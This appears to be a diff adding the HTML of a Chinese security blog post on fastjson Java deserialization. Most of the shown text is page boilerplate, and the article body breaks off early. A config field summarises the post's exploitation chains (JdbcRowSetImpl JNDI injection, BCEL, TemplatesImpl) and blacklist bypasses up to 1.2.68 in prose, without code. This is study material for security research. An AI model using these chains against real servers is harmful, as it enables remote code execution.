@@ -1,0 +1,753 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>java反序列化之fastjson | Sherlock</title><meta name="keywords" content="智商不够,勤勉来凑;眼神不太好"><meta name="author" content="Sherlock"><meta name="copyright" content="Sherlock"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="java反序列化之fastjson"><meta name="application-name" content="java反序列化之fastjson"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="java反序列化之fastjson"><meta property="og:url" content="http://example.com/2025/02/13/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bfastjson/index.html"><meta property="og:site_name" content="Sherlock"><meta property="og:description" content="前言maven依赖：https:&amp;#x2F;&amp;#x2F;mvnrepository.com&amp;#x2F;artifact&amp;#x2F;com.alibaba&amp;#x2F;fastjson&amp;#x2F;1.2.24 12345&amp;lt;dependency&amp;gt;    &amp;lt;groupId&amp;gt;com.alibaba&amp;lt;&amp;#x2F;groupId&amp;gt;    &amp;lt;"><meta property="og:locale" content="en"><meta property="og:image" content="http://example.com/img/Sherlock.jpg"><meta property="article:author" content="Sherlock"><meta property="article:tag" content="智商不够,勤勉来凑;眼神不太好"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="http://example.com/img/Sherlock.jpg"><meta name="description" content="前言maven依赖：https:&amp;#x2F;&amp;#x2F;mvnrepository.com&amp;#x2F;artifact&amp;#x2F;com.alibaba&amp;#x2F;fastjson&amp;#x2F;1.2.24 12345&amp;lt;dependency&amp;gt;    &amp;lt;groupId&amp;gt;com.alibaba&amp;lt;&amp;#x2F;groupId&amp;gt;    &amp;lt;"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://example.com/2025/02/13/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bfastjson/"><link rel="preconnect" href="//cdn.cbd.int"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.20/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  linkPageTop: undefined,
+  peoplecanvas: {"enable":true,"img":"https://upload-bbs.miyoushe.com/upload/2023/09/03/125766904/ee23df8517f3c3e3efc4145658269c06_5714860933110284659.png"},
+  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
+  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
+  LA51: undefined,
+  greetingBox: undefined,
+  twikooEnvId: '',
+  commentBarrageConfig:undefined,
+  root: '/',
+  preloader: {"source":3},
+  friends_vue_info: undefined,
+  navMusic: true,
+  mainTone: undefined,
+  authorStatus: {"skills":["🔍 分享与热心帮助","🤝 喜欢团结协作","🏃 脚踏实地行动派","💢 壮汉人狠话不多"]},
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
+  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: true,
+    simplehomepage: false,
+    post: true
+  },
+  runtime: 'days',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"Author: Sherlock","link":"Link: ","source":"Source: Sherlock","info":"Copyright is owned by the author. For commercial reprints, please contact the author for authorization. For non-commercial reprints, please indicate the source.","copySuccess":"Copy success, copy and reprint please mark the address of this article"}},
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"Traditional Chinese Activated Manually","cht_to_chs":"Simplified Chinese Activated Manually","day_to_night":"Dark Mode Activated Manually","night_to_day":"Light Mode Activated Manually","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
+      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false,
+  shortcutKey: undefined,
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  configTitle: 'Sherlock',
+  title: 'java反序列化之fastjson',
+  postAI: '',
+  pageFillDescription: '前言, 基础流程分析, 1.2.24利用, JdbcRowSetImpl, bcel.ClassLoader(不出网), TemplatesImpl, fastjson高版本绕过, 版本ltx3D1.2.47绕过, fastjsonltx3D1.2.68前言依赖在序列化时利用的反射机制通过调用的方法获取属性值在反序列化时通过无参构造方法创建对象并利用方法设置属性值基础流程分析是一个类使用的方法将字符串解析为一个对象通过上述代码可以初步了解到的作用类测试代码上述的代码把字符串解析为了一个对象然后我们还可以正常调用它的方法在这个过程中调用了哪些方法如下所示可以看到除了最后我们自己调用的方法外系统会自动调用方法给对象进行赋值再来一个例子通过字段指定一个类让字符串根据它来进行解析运行结果如下从结果我们可以看出来在这个过程中自动调用了构造方法还有和方法来进行赋值和输出上述代码通过我们输入的类的不同而会调用相对应的方法这就是的一个功能接下来我们来调试一下探究这个过程跟进去我们再继续跟进方法中这段代码创建了一个对象用于解析字符串是库中的一个核心类负责将字符串解析为对象对于的初始化可以来到的构造函数来看往下走到开始进行解析字符串跟进去继续跟进去该方法会对字符串中的每一个字符都进行解析如第一次就是对进行解析没有传入本身或者是任何和我们字符串内容相关的断定反序列化还没进行创建一个空的用来后续装载生成的对象在下一行代码中会调用接收的方法这是最重要的地方我们跟进去一直往下走到这里该处代码用来跳过任意个逗号不重要往下走定义了一个变量用于存放中的键名做判断当前是双引号于是进行操作读取两个双引号之间的内容获取到之后向下走来到了对的判断这里把代码块收起来方便做一个宏观的分析如果的值是即我们当前的情况走进第一个代码块展开分析可以发现有一行代码中有跟进去看看首先会从缓存中查找找到了就直接返回了没找到的话先根据进行类特殊性检验如开头就意味着是数组类则返回对象如果是开头结尾的类数组写法则去掉首位再调用支持对数组的类加载不支持之后就是简单的调在本地加载类加入缓存返回继续往下跟来到这个地方出现了我们一开始传入的空的实际上每一轮循环加载完一对和就会往内存入第一轮尚未结束没存入任何的东西所以这里还是暂时跳过下方来到最关键的一部分是真正开始反序列化流程的一部分从中获取一个反序列化器紧接着通过这个反序列化器进行反序列化我们跟进去看反序列化器是怎么获取到的先从缓存表中获取在的构造函数中将许多内置类进了缓存中但是显然我们这个类是不在的我们继续往下走走到下面这步时跟进去往下走来到一处代码块若在被序列化的类上面使用了注解则会走进这里面的获取反序列化器的逻辑进行操作等于说是用户自定义了一个反序列化器继续往下走到一处黑名单仅仅是禁了一个类而已继续往下走之后便是一堆的判断判断类是否为某个包下的然后对应进行处理一路过去来到了创建顾名思义应该是生成一个的反序列化解析器我们跟进去开头定义了的值默认为继续往下看几种情况下会变为父类标识符为非泛型类型参数不为如的返回结果就是的返回结果就是是否使用类加载器这里稍微进分析一下循环一轮过后为的父类加载器即假如说这里的的类加载器是为拓展库的类则会返回但是显然是应用程序的类其类加载器也应为出来后继续往下走发现还有一部分的能让为的地方比较简单就不一一列举了继续往下走有一行方法的调用主要就是返回的一些属性包括属性名方法名等我们跟进去首先获取类的属性的方法构造方法等行开始将代码块收起来宏观上分为三部分第一部分遍历所有的方法目的是为了获取你的所有字段第二部分遍历所有的属性上面我们的类属性都是的所以相当于没有第三部分再次遍历所有的方法实际上第一次遍历是调所有的第二次遍历是调所有的我们先进入第一个循环中先进行判断方法名长度是否大于是否是静态方法以及返回值是否为或者类本身最开始是不满则条件跳过直到方法时进入从句往下走规定方法要以开头才能进入从句中继续往下走将对应的全部字符转小写变为往后一直走通过操作遍历完过后将结果保存到跟进库库步过直到下面这个比较重要的变量这里先不赘述了先埋一个伏笔方法就是将结果放到中都遍历完之后开始遍历所有的字段对的遍历过程比较简单不做详细描述了往下到的遍历前面的判断和遍历是相似的直到这一部分判断代码只有当的返回值满足这个中的等才能进入到代码中走到最后的也就是说才能被当做一个被加入到中同时还需要满足中不包含这个字段也就是说要是前面方法将某个字段加入了中后就不会再通过方法加入了在这里我们肯定都是不满足的所以都会跳过走到最后一行的代码处将前面遍历的字段还有方法之类的封装起来走出来后能在中看到刚刚封装好的字段在下面一部分代码中还有好几种方法可以使得的值为上面多次提到这个开关那么它的作用究竟是什么呢往下走之后紧接着就走到一个判断如果是默认的的话那么不会走到而是会返回一个的创建反序列化器的方法返回后我们可以看到反序列化器是成功创建了出来但是这样的类有什么不好的地方呢就是临时创建的类在调试过程中发现根本不清楚这个过程做了什么调用栈上虽然有但是点击并没有任何的反应因此如果想要调试我们只能让为然后来创建一个反序列化器在上面的伏笔中中存在通过判断字段是否来关闭也就是只要字段为使得为那么我们就不会像刚才那样返回一个的创建反序列化器的方法而是走到这样子我们就可以好好地进行调试了那么的值只有在下面这一处可以改中的处判断方法的参数是否为不是的话就为然后在前面的方法的循环中我们可以看到要是参数值不为的话会直接跳出循环都走不到处自然也就修改不了的值因此我们只能够通过方法来进行修改也就是通过一个对象与其对应的只有一个如果有会优先调用而不会调用但是上面分析过了调用这个需要的返回值满足那几种类型等但是问题不大类修改为如下修改完后我们重新调试一下成功修改成功关掉开关于是我们返回的就是一个于是我们也就能正常地进行调试了上面忙活这么多就是为了能正常地调试这一次的和上次的相比多了一个字段然后获取到了之后我们就调用它的反序列化方法一直跟进方法行开始对每个字段遍历进行实例化赋值操作行步入方法该函数先进行一个判断是否是接口是的话就生成一个代理不是的话就调用其自己的默认构造函数来进行实例化再回去继续往下走走到处开始给字段赋值了这是最重要的一部分一路往下走来到了一处反射调用来完成赋值步过控制台输出的赋值同理至此一整个反序列化的流程结束回到前面成功拿到了对象在继续往下走的过程来到会调用这个过程就是前面一步是把字符串转换为了对象然后这一步是把对象转换为字符串我们跟进去往下走到这一步该行代码会获取到一个与指定类关联的对象序列化器往下走到这一步跟进去会在这里获取值跟进方法里然后我们再跟进方法在这里面会反射调用方法到这里基本的流程差不多就结束从上面我们可以得知在反序列化过程中会自动调用方法也就是说我们只要有一个类其中有一个方法中有危险函数那么我们就可以实行攻击修改一下类测试代码执行后成功弹出计算器利用在方法下面存在明显的注入的参数是通过来获取的我们要怎么判断变量可控就是变量要有对应的或者是或者是满足条件的具体可以去看文件中的对应代码因此变量可控由相关知识可知这是一个地址因为点进去下面就是对应的方法接下来就继续往上找找方法是否在或者中由上面逻辑调试中的分析想调用有两种途径返回值规定的那些个才能被到中后续被调用但是这里的返回值显然不符合要求需要能走到而走到需要保证到你这需要的之前的所有流程不抛出异常能正常但是这里第一个方法就了没成功因此只能走也就是方法先开启服务器并在端口挂载好恶意类如下测试成功弹出计算器这条链由于是利用了注入所以会受到版本限制依赖限制同时还需要出网才可以不出网我们要利用的是该类中的方法该方法中主要利用部分如下类名满足一定条件后会执行方法生成类然后再用方法进行字节码加载我们先单纯利用该方法不涉及到来测试一下运行后会成功弹出计算器至于为什么代码中有一行呢这是因为上面的方法中会有一个方法所以相应的我们就需要来个方法喽接下来我们就要想办法调用到方法了引入依赖我们所找的类为所需要的方法为我们可以知道该方法中通过函数来加载类现在我们就要看和有没有对应的方法方法的底层就是调用方法两个变量都可控现在我们再从方法向上查找看看会不会在或中走到再向上查找走到了还在同一个文件内可以看到是一个方法返回类型不满足那几种所以就是在方法中调用的方法正向漏洞代码验证时可以的所以我们的如下测试成功弹出计算器实用价值不高字节码由于该类传入的参数好几个都没有对应的和方法所以要利用它的话需要改配置高版本绕过版本绕过依赖我们用上之前的来运行的话便会直接报错如下我们在最后一行打个断点调试一下发现是在判断值是否为之后做了一个的校验我们跟进这个函数看一看一直往下走会先从两个缓存和中进行加载现在肯定是没有的所以我们继续往下走会直接被黑名单拦截黑名单如下从头看该函数只有通过了黑白名单的校验后才能继续到类加载白名单默认是空的所以显然走不到这里的类加载我们再往下看看别的能类加载的代码这是从缓存中的指定类中获取如果缓存中没有的话会继续从反序列化器中找进来看了下也是从缓存中加载类可以看都是从缓存中来加载类那么我们就是要看看能不能向缓存类中添加一些我们的恶意类来进行绕过查找对进行操作的部分来到的方法于是我们查找该的用法在本类中的用法当然是派不上用场的在函数中调用但是受限于都走不进去然后就是中的中当为的时候会将放入中该部分位于方法中说明这东西和反序列化有关注意实现了和接口所以这玩意本质上是一个序列化器反序列化器上文提到过反序列化器是从中获取到的这个我们上文差不多分析过了走进去底层实际上是在缓存里找对应的键值对如果我们反序列化的类是那么就会调用的反序列化器所以在反序列化的时候走到中就会调用的然后就会把我们传入的字符串传给因此一共是分为两步第一步是先将我们的恶意类加载到缓存中第二部是从缓存中查找我们的恶意类从而绕过函数第一步反序列化一个类值为恶意类接着用之前的至于为什么参数名要是见下图当第二次经过该函数的时候可以直接从缓存中加载从而绕过检测题外话实际使用走到的时候会发现和是不一样的原先的黑名单变成了一个哈希表主打的就是一个防止安全人员研究这玩意来进行绕过但是在这个版本还是没防住通过向添加类名来达到类加载的绕过已破解开的黑名单哈希如下在版本用上以前的直接报错调试一下看看是哪里出了问题当走到中触发的地方加入了一个参数',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: true,
+  isToc: true,
+  postUpdate: '2025-02-25 21:32:47',
+  postMainColor: '',
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+          if (t === undefined) {
+            if (isLightMode) activateLightMode()
+            else if (isDarkMode) activateDarkMode()
+            else if (isNotSpecified || hasNoSupport) {
+              const now = new Date()
+              const hour = now.getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="/img/Sherlock.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.getElementById('loading-box').classList.add("loaded");
+  },
+  initLoading: () => {
+    document.getElementById('loading-box').classList.remove("loaded")
+  }
+}
+window.addEventListener('load',()=> { preloader.endLoading() })
+setTimeout(function(){preloader.endLoading();},10000)
+
+if (true) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title">Sherlock</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page faa-parent animated-hover" href="/link/"><span> 友人帐</span></a></div><div class="menus_item"><a class="site-page faa-parent animated-hover" href="/essay/"><span> 闲言碎语</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> Search</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> Newest Comments</span></div><div class="aside-list"><span>loading...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/cors/" style="font-size: 1.05rem;">cors<sup>1</sup></a><a href="/tags/csrf/" style="font-size: 1.05rem;">csrf<sup>1</sup></a><a href="/tags/php/" style="font-size: 1.05rem;">php<sup>5</sup></a><a href="/tags/python/" style="font-size: 1.05rem;">python<sup>3</sup></a><a href="/tags/sql/" style="font-size: 1.05rem;">sql<sup>3</sup></a><a href="/tags/ssrf/" style="font-size: 1.05rem;">ssrf<sup>1</sup></a><a href="/tags/ssti/" style="font-size: 1.05rem;">ssti<sup>2</sup></a><a href="/tags/web/" style="font-size: 1.05rem;">web<sup>3</sup></a><a href="/tags/xss/" style="font-size: 1.05rem;">xss<sup>1</sup></a><a href="/tags/%E5%89%8D%E7%AB%AF/" style="font-size: 1.05rem;">前端<sup>2</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>Archives</span><a class="card-more-btn" href="/archives/" title="More">
+    <i class="anzhiyufont anzhiyu-icon-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/02/"><span class="card-archive-list-date">February 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/01/"><span class="card-archive-list-date">January 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/12/"><span class="card-archive-list-date">December 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/11/"><span class="card-archive-list-date">November 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">4</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/10/"><span class="card-archive-list-date">October 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/09/"><span class="card-archive-list-date">September 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/08/"><span class="card-archive-list-date">August 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/07/"><span class="card-archive-list-date">July 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item on" id="consoleCommentBarrage" onclick="anzhiyu.switchCommentBarrage()" title="热评开关"><a class="commentBarrage"><i class="anzhiyufont anzhiyu-icon-message"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" itemprop="url">java反序列化</a></span><span class="article-meta tags"></span></div></div><h1 class="post-title" itemprop="name headline">java反序列化之fastjson</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2025-02-13T13:07:39.000Z" title="Created 2025-02-13 21:07:39">2025-02-13</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2025-02-25T13:32:47.456Z" title="Updated 2025-02-25 21:32:47">2025-02-25</time></span></div><div class="meta-secondline"><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为福建"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>福建</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://example.com/2025/02/13/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bfastjson/"><header><a class="post-meta-categories" href="/categories/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" itemprop="url">java反序列化</a><h1 id="CrawlerTitle" itemprop="name headline">java反序列化之fastjson</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">Sherlock</span><time itemprop="dateCreated datePublished" datetime="2025-02-13T13:07:39.000Z" title="Created 2025-02-13 21:07:39">2025-02-13</time><time itemprop="dateCreated datePublished" datetime="2025-02-25T13:32:47.456Z" title="Updated 2025-02-25 21:32:47">2025-02-25</time></header><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>maven依赖：<a target="_blank" rel="noopener" 